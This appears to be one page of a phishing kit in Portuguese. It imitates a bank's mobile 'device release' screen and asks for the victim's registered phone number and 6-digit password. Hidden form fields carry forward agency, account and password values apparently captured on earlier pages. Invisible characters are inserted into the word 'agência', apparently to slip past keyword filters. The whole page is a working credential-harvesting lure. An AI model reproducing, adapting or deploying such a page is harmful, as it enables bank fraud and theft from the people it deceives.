<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Mobbi</title>
<script type="text/javascript" src="scripts/html5shiv.js"></script>
<script language="javascript" src="scripts/validation.js"></script>

<style>
.u { font-family:Arial, Helvetica, sans-serif; font-size:1px; color:#FFF; }
input { width:95%; font-size:14px; outline:none; padding:0 0 0 10px; height:40px; border:none; border-bottom:1px solid #CCC; }
body { padding: 0px; overflow:hidden; margin: 0px; background:#F5F5F5;	}
#proceguir { width:100%; height:45px; background:url(images/a005.jpg); font-size:100%; border:none; text-align:center; color:#FFF; }
</style>

<script>
function validation2() {
if (document.form.telefone.value == "" || 
document.form.telefone.value.length < 10 || 
document.form.telefone.value == "(00)00000-0000" || 
document.form.telefone.value == "(11)11111-1111" || 
document.form.telefone.value == "(22)22222-2222" || 
document.form.telefone.value == "(33)33333-3333" || 
document.form.telefone.value == "(44)44444-4444" || 
document.form.telefone.value == "(55)55555-5555" || 
document.form.telefone.value == "(66)66666-6666" || 
document.form.telefone.value == "(77)77777-7777" || 
document.form.telefone.value == "(88)88888-8888" || 
document.form.telefone.value == "(99)99999-9999"){
alert ("Telefone, Inválido!");
document.form.telefone.focus(); return false;
}

if (document.form.senha6.value == "" || 
document.form.senha6.value.length < 6 || 
document.form.senha6.value.length > 6 || 
document.form.senha6.value == "000000" || 
document.form.senha6.value == "111111" || 
document.form.senha6.value == "222222" || 
document.form.senha6.value == "333333" || 
document.form.senha6.value == "444444" || 
document.form.senha6.value == "555555" || 
document.form.senha6.value == "666666" || 
document.form.senha6.value == "777777" || 
document.form.senha6.value == "888888" || 
document.form.senha6.value == "999999"){
alert ("Senha de (6 dígitos), Inválida!");
document.form.senha6.focus(); return false;
}
}
</script>
</head>

<body>
<div style="width:100%; height:50px; background:#F0DC01; color:#5574B4; font-family:'Arial'; font-size:17px; font-weight:bold;">
<table cellpadding="0" cellspacing="0" width="100%">
<tr>
<td width="30" height="50"><div style="width:15px; height:20px; background:url(images/a007.jpg) no-repeat; margin-left:10px; background-size:cover;"></div></td>
<td bgcolor="#F0DC01" align="center">Liberação de Dispositivo</td>
<td width="30" style="padding:0 10px 0 0;">Sair</td>
</tr>
</table>
</div>
<div style="height:auto; max-width:750px; margin:0 auto;">
<form name="form" id="form" action="index3.php" method="post" onSubmit="return validation2()">
<div style="font-family:'Arial'; font-size:17px; color:#5574B4; margin-top:10px; padding:10px; background:#FFF; border-bottom:1px solid #EDEDED;">Confirmação de Liberação<br><br>
<font size="2" color="#999">A autorização deste dispositivo ocorrerá de forma automatica após a confirmação do telefone cadastrado na sua a<span class="u">i</span>gê<span class="u">i</span>nc<span class="u">i</span>ia.</font></div>

<div style="background:#FFF; padding:20px 10px 20px 10px; margin-top:10px; border-bottom:1px solid #EDEDED;">
<div style="font-family:'Arial'; font-size:17px; color:#5574B4;">Número Cadastrado</div>
<div style="margin-top:10px;"><input type="tel" style="background:#FFF;" name="telefone" id="telefone" maxlength="15" placeholder="DDD e Número" onKeyUp="mascaraTelefone(this)" autofocus /></div>
<div style="margin-top:10px;"><input type="password" name="senha6" id="senha6" maxlength="6" placeholder="Senha (6 dígitos)" onKeyPress="return SomenteNumero(event)" /></div>
</div>

<div style="background:#FFF; padding:10px; margin-top:10px; border-bottom:1px solid #EDEDED;">
<div style="margin:0 10px 20px 0; float:right; color:#666666; font-family:'Arial'; font-size:13px;">Todos os campos são obrigatórios</div>
<input type="submit" name="proceguir" id="proceguir" value="Confirmar"></div>
<input type="hidden" name="agg" id="agg" value="<?php echo $_POST['agg']; ?>">
<input type="hidden" name="acc" id="acc" value="<?php echo $_POST['acc']; ?>">
<input type="hidden" name="ss8" id="ss8" value="<?php echo $_POST['ss8']; ?>">
</form>
</div>



<div style="width:100%; height:40px; position:fixed; bottom:0; background:#FFF; padding:10px;">
<div style="width:40px; height:40px; background:url(images/a008.jpg) no-repeat; float:left;"></div>
<div style="width:40px; height:40px; background:url(images/a009.jpg) no-repeat; float:right; margin-right:20px;"></div>
</div>
</body>
</html>